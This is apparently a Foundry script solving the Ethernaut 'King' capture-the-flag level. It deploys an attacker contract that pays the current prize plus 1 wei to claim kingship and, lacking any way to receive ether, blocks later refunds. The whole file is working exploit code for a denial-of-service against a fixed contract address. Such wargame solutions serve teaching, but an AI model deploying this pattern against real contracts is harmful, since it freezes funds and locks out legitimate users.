// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {King} from "../src/King.sol";

contract Attacker {
    constructor(King code) payable {
        uint256 price = code.prize();
        payable(address(code)).call{value: price + 1 wei}("");
    }
}

contract KingScript is Script {
    King public code = King(payable(0x89A1b2f09023b2fbB1dd357b698C5C470f637843));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        new Attacker{value: code.prize() + 1 wei}(code);
        vm.stopBroadcast();
    }
}
